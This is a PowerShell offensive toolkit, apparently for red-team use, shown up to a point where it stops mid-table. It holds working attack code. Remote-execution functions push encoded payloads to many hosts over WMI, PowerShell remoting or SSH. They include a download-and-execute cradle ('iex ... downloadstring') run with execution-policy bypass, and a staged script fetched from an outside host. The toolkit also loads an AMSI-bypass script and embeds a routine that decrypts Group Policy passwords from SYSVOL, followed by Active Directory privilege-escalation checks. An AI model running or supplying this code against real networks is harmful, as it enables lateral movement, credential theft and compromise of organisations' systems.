function Invoke-WindowsWMI{
    <#
    Install-Module -Name PoshRSJob -Force
    Too big scripts will not work with ScriptPath

    Invoke-WindowsWMI -Url 'http://10.10.10.123/WinEnum.ps1'
    Invoke-WindowsWMI -ScriptPath 'invoke-stager.ps1'
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",

        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,
        
        [string]$Url
    )
    function local:Invoke-WMIExec{
        <#        
            .SYNOPSIS
             Execute command remotely and capture output, using only WMI.
             Copyright (c) Noxigen LLC. All rights reserved.
             Licensed under GNU GPLv3.
        
            .DESCRIPTION
            This is proof of concept code. Use at your own risk!
            
            Execute command remotely and capture output, using only WMI.
            Does not reply on PowerShell Remoting, WinRM, PsExec or anything
            else outside of WMI connectivity.
            
            .LINK
            https://github.com/OneScripter/WmiExec
            
            .EXAMPLE
            PS C:\> .\WmiExec.ps1 -ComputerName SFWEB01 -Command "gci c:\; hostname"
        
            .NOTES
            ========================================================================
                 NAME:		WmiExec.ps1
                 
                 AUTHOR:	Jay Adams, Noxigen LLC
                             
                 DATE:		6/11/2019
                 
                 Create secure GUIs for PowerShell with System Frontier.
                 https://systemfrontier.com/powershell
            ==========================================================================
        #>
        Param(
            [string]$ComputerName,
            [string]$Command
        )
        
        function CreateScriptInstance([string]$ComputerName)
        {
            # Check to see if our custom WMI class already exists
            $classCheck = Get-WmiObject -Class Noxigen_WmiExec -ComputerName $ComputerName -List -Namespace "root\cimv2"
            
            if ($classCheck -eq $null)
            {
                # Create a custom WMI class to store data about the command, including the output.
                $newClass = New-Object System.Management.ManagementClass("\\$ComputerName\root\cimv2",[string]::Empty,$null)
                $newClass["__CLASS"] = "Noxigen_WmiExec"
                $newClass.Qualifiers.Add("Static",$true)
                $newClass.Properties.Add("CommandId",[System.Management.CimType]::String,$false)
                $newClass.Properties["CommandId"].Qualifiers.Add("Key",$true)
                $newClass.Properties.Add("CommandOutput",[System.Management.CimType]::String,$false)
                $newClass.Put() | Out-Null
            }
            
            # Create a new instance of the custom class so we can reference it locally and remotely using this key
            $wmiInstance = Set-WmiInstance -Class Noxigen_WmiExec -ComputerName $ComputerName
            $wmiInstance.GetType() | Out-Null
            $commandId = ($wmiInstance | Select-Object -Property CommandId -ExpandProperty CommandId)
            $wmiInstance.Dispose()
            
            # Return the GUID for this instance
            return $CommandId
        }
        
        function GetScriptOutput([string]$ComputerName, [string]$CommandId)
        {
            $wmiInstance = Get-WmiObject -Class Noxigen_WmiExec -ComputerName $ComputerName -Filter "CommandId = '$CommandId'"
            $result = ($wmiInstance | Select-Object CommandOutput -ExpandProperty CommandOutput)
            $wmiInstance | Remove-WmiObject
            return $result
        }
        
        function ExecCommand([string]$ComputerName, [string]$Command)
        {
            #Pass the entire remote command as a base64 encoded string to powershell.exe
            $commandLine = "powershell.exe -NoLogo -NonInteractive -ExecutionPolicy Unrestricted -WindowStyle Hidden -EncodedCommand " + $Command
            $process = Invoke-WmiMethod -ComputerName $ComputerName -Class Win32_Process -Name Create -ArgumentList $commandLine
            
            if ($process.ReturnValue -eq 0)
            {
                $started = Get-Date
                
                Do
                {
                    if ($started.AddMinutes(2) -lt (Get-Date))
                    {
                        Write-Host "PID: $($process.ProcessId) - Response took too long."
                        break
                    }
                    
                    # TODO: Add timeout
                    $watcher = Get-WmiObject -ComputerName $ComputerName -Class Win32_Process -Filter "ProcessId = $($process.ProcessId)"
                    
                    Write-Host "PID: $($process.ProcessId) - Waiting for remote command to finish..."
                    
                    Start-Sleep -Seconds 1
                }
                While ($watcher -ne $null)
                
                # Once the remote process is done, retrieve the output
                $scriptOutput = GetScriptOutput $ComputerName $scriptCommandId
                
                return $scriptOutput
            }
        }
        
        function Main()
        {
            $commandString = $Command
            
            # The GUID from our custom WMI class. Used to get only results for this command.
            $scriptCommandId = CreateScriptInstance $ComputerName
            
            if ($scriptCommandId -eq $null)
            {
                Write-Error "Error creating remote instance."
                exit
            }
            
            # Meanwhile, on the remote machine...
            # 1. Execute the command and store the output as a string
            # 2. Get a reference to our current custom WMI class instance and store the output there!
                
            $encodedCommand = "`$result = Invoke-Command -ScriptBlock {$commandString} | Out-String; Get-WmiObject -Class Noxigen_WmiExec -Filter `"CommandId = '$scriptCommandId'`" | Set-WmiInstance -Arguments `@{CommandOutput = `$result} | Out-Null"
            
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($encodedCommand))
            
            $result = ExecCommand $ComputerName $encodedCommand
            
            Write-Host "[+]Results`n"
            Write-Output $result
        }
        main
    }    
    if(Test-Path $Computers){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob -ErrorAction Stop
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Error checking
    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
        return
    }
    #Make sure Invoke-WMIExec is imported
    $wmi=(Get-ChildItem function: | where {$_.name -like 'Invoke-WMIExec'})
    if(-not($wmi)){
        Write-Output "Please import WmiExec.ps1 manually"
        Write-Output ". .\WmiExec.ps1"
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    if($ScriptPath){
        $cmd=Get-Content $ScriptPath -ErrorAction Stop
    }else{
        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -FunctionsToLoad 'Invoke-WMIExec' -ScriptBlock {
        param($Inputargs)
        $Location = $Inputargs.Location
        $Enc = $Inputargs.Enc
        $output = Invoke-WMIExec -ComputerName $_ -Command "powershell -nop -exe bypass -enc $Enc"
        Add-Content -Path "$Location\$($_)" -Value $output
    } | Wait-RSJob -ShowProgress
    $errors=Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Output "[-] Failed connecting to following hosts"
        Write-Output $errors
    }
}
function Invoke-WindowsPS{
    <#
    Install-Module -Name PoshRSJob -Force
    Too big scripts will not work with ScriptPath

    Invoke-WindowsPS -Url 'http://10.10.10.123/WinEnum.ps1'
    Invoke-WindowsPS -ScriptPath 'invoke-stager.ps1'
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = ".\windows.txt",
        
        [ValidateScript({Test-Path -Path $_ })]
        $ScriptPath,

        [string]$Url,

        [Parameter(Mandatory=$true)]
        [pscredential]$Credential,

        [bool]$UseSSL = $False
    )
    #Import ComputerNames
    if(Test-Path $Computers){
        $Computers = Get-Content $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Error checking
    if(($null -eq $Url) -and ($null -eq $ScriptPath)){
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\windows"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'windows' -Path "." | Out-Null
    }
    #Args
    if($ScriptPath){
        $cmd=Get-Content $ScriptPath -ErrorAction Stop
    }else{
        $cmd="iex (new-object net.webclient).downloadstring('$Url')"
    }
    $Enc=[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cmd))
    $ScriptParams = @{
        'Location' = $OutputFolder
        'Enc' = $Enc
        'Credential' = $Credential
        'UseSSL' = $UseSSL
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob
    $Computers | start-rsjob -Name {$_} -ArgumentList $ScriptParams -ScriptBlock {
            param($Inputargs)
            $Location = $Inputargs.Location
            $Enc = $Inputargs.Enc
            $Credential = $Inputargs.Credential
            try{
                if($Inputargs.UseSSL){
                    $session = New-PSSession -ComputerName $_ -Credential $Credential -UseSSL -ErrorAction Stop
                }else{
                    $session = New-PSSession -ComputerName $_ -Credential $Credential -ErrorAction Stop
                }
            }catch{
                Add-Content -Path "$Location\$($_)" -Value '[-] Error connecting to host'
            }
            try{
                $output = Invoke-Command -Session $session -ScriptBlock {powershell -nop -exe bypass -enc $args[0]} -ArgumentList $Enc
            }catch{
                $output = "[-] $($_.Exception.Message)"
            }
            Add-Content -Path "$Location\$($_)" -Value $output
            Remove-PSSession $session
            
    } | Wait-RSJob -ShowProgress
    $errors = Get-RSJob | where {$_.HasErrors -eq $true}
    if($errors){
        Write-Output "[-] Failed on following hosts"
        Write-Output $errors
    }
}
function Invoke-LinuxSSH{
    <#
    import-csv linux.csv
    ComputerName Username Password
    ------------ -------- --------
    192.168.1.40 cube     cube

    Invoke-Linux -computers
    Invoke-linux -computers -script

    Install-Module -Name Posh-SSH -Force
    Install-Module -Name PoshRSJob -Force
    #>
    param (
        [Parameter(Position=0,ValueFromPipeline=$True)]
        $Computers = '.\linux.csv',
        [ValidateScript({Test-Path -Path $_ })]
        [string]$ScriptPath
    )
    #Import ComputerName, Username, Passwords from CSV
    if(Test-Path $Computers){
        $Computers = import-csv $Computers -ErrorAction Stop
    }
    #Import dependencies
    try{
        Import-Module PoshRSJob -ErrorAction Stop
        Import-Module Posh-SSH -ErrorAction Stop
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        return
    }
    #Create output folder
    $OutputFolder = "$((Get-Location).path)\linux"
    if(-not(Test-Path $OutputFolder)){
        New-Item -ItemType Directory -Name 'linux' -Path "." | Out-Null
    }
    #Get latest LinEnum.sh
    #Use a local copy for extended testing
    if($ScriptPath){
        $Script = Get-Content $ScriptPath -ErrorAction Stop
    }else{
        try{
            $Script = (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh')
        }catch{
            Write-Output "[-] Can't Download LinEnum"
            Write-Output "[-] $($_.Exception.Message)"
            return
        }
    }
    #Params
    $ScriptParams = @{
        'Script' = $Script
        'Location' = $OutputFolder
    }
    #One thread for every computer :D
    Get-RSJob | where {$_.state -like 'Completed'} | Remove-RSJob 
    $Computers | start-rsjob -Name {$_.computername} -ArgumentList $ScriptParams -ModulesToImport 'Posh-SSH' -ScriptBlock {
            param($Inputargs)
            $Script = $Inputargs.Script
            $Location = $Inputargs.Location
            $secpasswd = ConvertTo-SecureString $_.password -AsPlainText -Force
            $creds = New-Object System.Management.Automation.PSCredential ($_.username, $secpasswd)
            try{
                $session = New-SSHSession -ComputerName $_.ComputerName -Credential $creds -Force -WarningAction SilentlyContinue
            }catch{
                Add-Content -Path "$Location\$($_.ComputerName)" -Value '[-] Error connecting to host'
            }
            if($session){
                $output = (Invoke-SSHCommand -SSHSession $session -Command "$script | /bin/bash")
                Add-Content -Path "$Location\$($_.ComputerName)" -Value $output.output
                Remove-SSHSession -SSHSession $session | Out-Null
            }
        } | Wait-RSJob -ShowProgress
        $errors=Get-RSJob | where {$_.HasErrors -eq $true}
        if($errors){
            Write-Output "[-] Failed connecting to following hosts"
            Write-Output $errors
        }
}
function Invoke-DomainEnum{
    <#
    Invoke-Domain -DomainController 192.168.3.10 -Domain hackme.local
    #>
    param (
        [string]$DomainController,
        [string]$Domain,
        [string]$DistinguishedName
    )
    begin{
        function local:Get-GroupPolicyPassword {
        <#
        .SYNOPSIS
        
        Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
        
        PowerSploit Function: Get-GPPPassword  
        Author: Chris Campbell (@obscuresec)  
        License: BSD 3-Clause  
        Required Dependencies: None  
        Optional Dependencies: None  
        
        .DESCRIPTION
        
        Get-GPPPassword searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords.
        
        .PARAMETER Server
        
        Specify the domain controller to search for.
        Default's to the users current domain
        
        .PARAMETER SearchForest
        
        Map all reaschable trusts and search all reachable SYSVOLs.
        
        .EXAMPLE
        
        Get-GPPPassword
        
        NewName   : [BLANK]
        Changed   : {2014-02-21 05:28:53}
        Passwords : {password12}
        UserNames : {test1}
        File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\DataSources\DataSources.xml
        
        NewName   : {mspresenters}
        Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
        Passwords : {Recycling*3ftw!, password123, password1234}
        UserNames : {Administrator (built-in), DummyAccount, dummy2}
        File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
        
        NewName   : [BLANK]
        Changed   : {2014-02-21 05:29:53, 2014-02-21 05:29:52}
        Passwords : {password, password1234$}
        UserNames : {administrator, admin}
        File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\ScheduledTasks\ScheduledTasks.xml
        
        NewName   : [BLANK]
        Changed   : {2014-02-21 05:30:14, 2014-02-21 05:30:36}
        Passwords : {password, read123}
        UserNames : {DEMO\Administrator, admin}
        File      : \\DEMO.LAB\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Services\Services.xml
        
        .EXAMPLE
        
        Get-GPPPassword -Server EXAMPLE.COM
        
        NewName   : [BLANK]
        Changed   : {2014-02-21 05:28:53}
        Passwords : {password12}
        UserNames : {test1}
        File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB982DA}\MACHINE\Preferences\DataSources\DataSources.xml
        
        NewName   : {mspresenters}
        Changed   : {2013-07-02 05:43:21, 2014-02-21 03:33:07, 2014-02-21 03:33:48}
        Passwords : {Recycling*3ftw!, password123, password1234}
        UserNames : {Administrator (built-in), DummyAccount, dummy2}
        File      : \\EXAMPLE.COM\SYSVOL\demo.lab\Policies\{31B2F340-016D-11D2-945F-00C04FB9AB12}\MACHINE\Preferences\Groups\Groups.xml
        
        .EXAMPLE
        
        Get-GPPPassword | ForEach-Object {$_.passwords} | Sort-Object -Uniq
        
        password
        password12
        password123
        password1234
        password1234$
        read123
        Recycling*3ftw!
        
        .LINK
        
        http://www.obscuresecurity.blogspot.com/2012/05/gpp-password-retrieval-with-powershell.html
        https://github.com/mattifestation/PowerSploit/blob/master/Recon/Get-GPPPassword.ps1
        http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences
        http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
        #>
    
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingWMICmdlet', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
        [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
        [CmdletBinding()]
        Param (
            [ValidateNotNullOrEmpty()]
            [String]
            $Server = $Env:USERDNSDOMAIN,
    
            [Switch]
            $SearchForest
        )
    
        # define helper function that decodes and decrypts password
        function Get-DecryptedCpassword {
            [CmdletBinding()]
            Param (
                [string] $Cpassword
            )
    
            try {
                #Append appropriate padding based on string length
                $Mod = ($Cpassword.length % 4)
    
                switch ($Mod) {
                    '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)}
                    '2' {$Cpassword += ('=' * (4 - $Mod))}
                    '3' {$Cpassword += ('=' * (4 - $Mod))}
                }
    
                $Base64Decoded = [Convert]::FromBase64String($Cpassword)
                
                # Make sure System.Core is loaded
                [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null
    
                #Create a new AES .NET Crypto Object
                $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                     0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b)
    
                #Set IV to all nulls to prevent dynamic generation of IV value
                $AesIV = New-Object Byte[]($AesObject.IV.Length)
                $AesObject.IV = $AesIV
                $AesObject.Key = $AesKey
                $DecryptorObject = $AesObject.CreateDecryptor()
                [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length)
    
                return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock)
            }
    
            catch { Write-Error $Error[0] }
        }
    
        # helper function to parse fields from xml files
        function Get-GPPInnerField {
        [CmdletBinding()]
            Param (
                $File
            )
    
            try {
                $Filename = Split-Path $File -Leaf
                [xml] $Xml = Get-Content ($File)
    
                # check for the cpassword field
                if ($Xml.innerxml -match 'cpassword') {
    
                    $Xml.GetElementsByTagName('Properties') | ForEach-Object {
                        if ($_.cpassword) {
                            $Cpassword = $_.cpassword
                            if ($Cpassword -and ($Cpassword -ne '')) {
                               $DecryptedPassword = Get-DecryptedCpassword $Cpassword
                               $Password = $DecryptedPassword
                               Write-Verbose "[Get-GPPInnerField] Decrypted password in '$File'"
                            }
    
                            if ($_.newName) {
                                $NewName = $_.newName
                            }
    
                            if ($_.userName) {
                                $UserName = $_.userName
                            }
                            elseif ($_.accountName) {
                                $UserName = $_.accountName
                            }
                            elseif ($_.runAs) {
                                $UserName = $_.runAs
                            }
    
                            try {
                                $Changed = $_.ParentNode.changed
                            }
                            catch {
                                Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.changed for '$File'"
                            }
    
                            try {
                                $NodeName = $_.ParentNode.ParentNode.LocalName
                            }
                            catch {
                                Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
                            }
    
                            if (!($Password)) {$Password = '[BLANK]'}
                            if (!($UserName)) {$UserName = '[BLANK]'}
                            if (!($Changed)) {$Changed = '[BLANK]'}
                            if (!($NewName)) {$NewName = '[BLANK]'}
    
                            $GPPPassword = New-Object PSObject
                            $GPPPassword | Add-Member Noteproperty 'UserName' $UserName
                            $GPPPassword | Add-Member Noteproperty 'NewName' $NewName
                            $GPPPassword | Add-Member Noteproperty 'Password' $Password
                            $GPPPassword | Add-Member Noteproperty 'Changed' $Changed
                            $GPPPassword | Add-Member Noteproperty 'File' $File
                            $GPPPassword | Add-Member Noteproperty 'NodeName' $NodeName
                            $GPPPassword | Add-Member Noteproperty 'Cpassword' $Cpassword
                            $GPPPassword
                        }
                    }
                }
            }
            catch {
                Write-Warning "[Get-GPPInnerField] Error parsing file '$File' : $_"
            }
        }
    
        # helper function (adapted from PowerView) to enumerate the domain/forest trusts for a specified domain
        function Get-DomainTrust {
            [CmdletBinding()]
            Param (
                $Domain
            )
    
            if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
                try {
                    $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
                    $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
                    if ($DomainObject) {
                        $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainTrust] Error contacting domain '$Domain' : $_"
                }
    
                try {
                    $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
                    $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
                    if ($ForestObject) {
                        $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
                    }
                }
                catch {
                    Write-Verbose "[Get-DomainTrust] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
                }
            }
        }
    
        # helper function (adapted from PowerView) to enumerate all reachable trusts from the current domain
        function Get-DomainTrustMapping {
            [CmdletBinding()]
            Param ()
    
            # keep track of domains seen so we don't hit infinite recursion
            $SeenDomains = @{}
    
            # our domain stack tracker
            $Domains = New-Object System.Collections.Stack
    
            try {
                $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
                $CurrentDomain
            }
            catch {
                Write-Warning "[Get-DomainTrustMapping] Error enumerating current domain: $_"
            }
    
            if ($CurrentDomain -and $CurrentDomain -ne '') {
                $Domains.Push($CurrentDomain)
    
                while($Domains.Count -ne 0) {
    
                    $Domain = $Domains.Pop()
    
                    # if we haven't seen this domain before
                    if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
    
                        Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"
    
                        # mark it as seen in our list
                        $Null = $SeenDomains.Add($Domain, '')
    
                        try {
                            # get all the domain/forest trusts for this domain
                            Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {
                                # only output if we haven't already seen this domain and if it's pingable
                                if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
                                    $Null = $Domains.Push($_)
                                    $_
                                }
                            }
                        }
                        catch {
                            Write-Verbose "[Get-DomainTrustMapping] Error: $_"
                        }
                    }
                }
            }
        }
    
        try {
            $XMLFiles = @()
            $Domains = @()
    
            $AllUsers = $Env:ALLUSERSPROFILE
            if (-not $AllUsers) {
                $AllUsers = 'C:\ProgramData'
            }
    
            # discover any locally cached GPP .xml files
            Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
            $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
    
            if ($SearchForest) {
                Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
                $Domains += Get-DomainTrustMapping
            }
            else {
                if ($Server) {
                    $Domains += , $Server
                }
                else {
                    # in case we're in a SYSTEM context
                    $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
                }
            }
    
            $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique
    
            ForEach ($Domain in $Domains) {
                # discover potential domain GPP files containing passwords, not complaining in case of denied access to a directory
                Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
                $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')
    
                if($DomainXMLFiles) {
                    $XMLFiles += $DomainXMLFiles
                }
            }
    
            if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }
    
            Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
    
            ForEach ($File in $XMLFiles) {
                $Result = (Get-GppInnerField $File.Fullname)
                $Result
            }
        }
    
        catch { Write-Error $Error[0] }
        }

        #Set variables
        if(!$DomainController -or !$Domain){
            try{
                $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }catch{
                Write-Output "[-] $($_.Exception.Message)"
                Write-Output "Use runas.exe with -domain and -domaincontroller"
                return
            }
        }
        if(!$Domain){
            $Domain = $current_domain.Name
        }

        if(!$DomainController){
            $DomainController = $current_domain.PdcRoleOwner.Name
        }

        if(!$DistinguishedName){
            $DistinguishedName = "DC=$($Domain.replace(".", ",DC="))"
        }else{
            $DistinguishedName = $DistinguishedName
        }

        #Checks dependensies
        @(
            'ASBBypass.ps1'
            'PowerView.ps1'
            'SharpHound.ps1'
        ) | foreach {
            if(-not(Test-Path $PSScriptRoot\$_)){
                Write-Output "Missing dependencies.. $($_)"
                $missing=$true
            }
        }
        if($missing){
            return
        }
        . $PSScriptRoot\ASBBypass.ps1
        . $PSScriptRoot\PowerView.ps1
        . $PSScriptRoot\SharpHound.ps1
        Invoke-Bypass | Out-Null
    }
    process{
        #Check Trust https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
        Write-Output "`n[*] Looking for Domain Trust"
        $trust=Get-DomainTrust -Domain $Domain -DomainController $DomainController
        foreach($DomainTrust in $trust){
            if($DomainTrust.TrustAttributes -contains 'WITHIN_FOREST'){
                Write-Output "[-] Possible Parent-Child Trust Found" 
                Write-Output $DomainTrust
            }else{
                Write-Output "`n[*] Trust Found"
                Write-Output $DomainTrust
             }
        }

        #https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
        #https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1
        Write-Output "`n[*] Looking for CPasswords in Sysvol"
        try{
            Get-GroupPolicyPassword -Server $DomainController -ErrorAction stop -SearchForest
        }catch{
            Write-Output "[-] Testing CPasswords in Sysvol Failed" 
        }

        #Active Directory Integrated DNS Wilcard Record https://blog.netspi.com/exploiting-adidns/
        Write-Output "`n[*] Testing Active Directory Integrated DNS Wilcard Record"
        try{
            $zones=(Get-DomainDNSZone -Domain $Domain -DomainController $DomainController).ZoneName | where {$_ -notlike 'RootDNSServers'}
        }catch{
            Write-Output "[-] Testing for Active Directory Integrated DNS Wilcard Record Failed" 
        }
        foreach($zone in $zones){
            $records=(Get-DomainDNSRecord -ZoneName $zone -Domain $Domain -DomainController $DomainController).name
            $wildcard = $false
            foreach($record in $records){
                if($record -contains '*'){
                    Write-Output "[+] Wildcard record exists for zone $zone" 
                    $wildcard = $true
                    break
                }
            }
            if(-not $wildcard){
            Write-Output "[-] Wildcard record does not exists for zone $zone" 
            }
        }

        #Machine Account Quota https://blog.netspi.com/machineaccountquota-is-useful-sometimes/
        Write-Output "`n[*] Testing ms-DS-MachineAccountQuota"
        Try{
            $adsi=Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ErrorAction stop
        }
        Catch{
            Write-Output "[-] Testing for ms-DS-MachineAccountQuota failed." 
        }
        if($adsi){
            $maq=($adsi.FindOne()).properties.'ms-ds-machineaccountquota'
            Write-Host "MachineAccountQuota: $maq"
         }

        #Accounts with high badpwdcount
        Write-Output "`n[*] Accounts with high badpwdcount"
        Get-DomainUser -Properties badpwdcount,samaccountname | where -Property badpwdcount -ge 3

        #Domain Password Policy
        Write-Output "`n[*] Testing Domain Password Policy"
        try{
            (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).SystemAccess
            (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).RegistryValues
            (Get-DomainPolicy -Domain $Domain -DomainController $DomainController -ErrorAction stop).KerberosPolicy
        }catch{
            Write-Output "[-] Testing for Domain Password Policy Failed." 
        }

        #Priv Exchange, thx to lkys37en https://github.com/lkys37en/Pentest-Scripts/tree/master/Powershell
        Write-Output "`n[*] Testing Exchange version"
        $ExchangeVersions = @{
            "15.02.0397.003" = "Exchange Server 2019 CU2, Not Vulnerable" 
            "15.02.0330.005" = "Exchange Server 2019 CU1, Not Vulnerable"
            "15.02.0221.012" = "Exchange Server 2019 RTM, Vulnerable to PrivExchange!" 
            "15.02.0196.000" = "Exchange Server 2019 Preview, Vulnerable to PrivExchange!" 
            "15.01.1779.002" = "Exchange Server 2016 CU13, Not Vulnerable"
            "15.01.1713.005" = "Exchange Server 2016 CU12, Vulnerable to PrivExchange!" 
            "15.01.1591.010" = "Exchange Server 2016 CU11, Vulnerable to PrivExchange!" 
            "15.01.1531.003" = "Exchange Server 2016 CU10, Vulnerable to PrivExchange!" 
            "15.01.1466.003" = "Exchange Server 2016 CU9, Vulnerable to PrivExchange!"  
            "15.01.1415.002" = "Exchange Server 2016 CU8, Vulnerable to PrivExchange!"  
            "15.01.1261.035" = "Exchange Server 2016 CU7, Vulnerable to PrivExchange!"  
            "15.01.1034.026" = "Exchange Server 2016 CU6, Vulnerable to PrivExchange!"  
            "15.01.0845.034" = "Exchange Server 2016 CU5, Vulnerable to PrivExchange!"  
            "15.01.0669.032" = "Exchange Server 2016 CU4, Vulnerable to PrivExchange!"  
            "15.01.0544.027" = "Exchange Server 2016 CU3, Vulnerable to PrivExchange!"  
            "15.01.0466.034" = "Exchange Server 2016 CU2, Vulnerable to PrivExchange!"  
            "15.01.0396.030" = "Exchange Server 2016 CU1, Vulnerable to PrivExchange!"  
            "15.01.0225.042" = "Exchange Server 2016 RTM, Vulnerable to PrivExchange!"  
            "15.01.0225.016" = "Exchange Server 2016 Preview, Vulnerable to PrivExchange!" 
            "15.00.1497.002" = "Exchange Server 2013 CU23, Not Vulnerable"
            "15.00.1473.003" = "Exchange Server 2013 CU22, Not Vulnerable!"
            "15.00.1395.004" = "Exchange Server 2013 CU21, Vulnerable to PrivExchange!"
            "15.00.1367.003" = "Exchange Server 2013 CU20, Vulnerable to PrivExchange!"
            "15.00.1365.001" = "Exchange Server 2013 CU19, Vulnerable to PrivExchange!"
            "15.00.1347.002" = "Exchange Server 2013 CU18, Vulnerable to PrivExchange!"
            "15.00.1320.004" = "Exchange Server 2013 CU17, Vulnerable to PrivExchange!"
            "15.00.1293.002" = "Exchange Server 2013 CU16, Vulnerable to PrivExchange!"
            "15.00.1263.005" = "Exchange Server 2013 CU15, Vulnerable to PrivExchange!"
            "15.00.1236.003" = "Exchange Server 2013 CU14, Vulnerable to PrivExchange!"
            "15.00.1210.003" = "Exchange Server 2013 CU13, Vulnerable to PrivExchange!"
            "15.00.1178.004" = "Exchange Server 2013 CU12, Vulnerable to PrivExchange!"
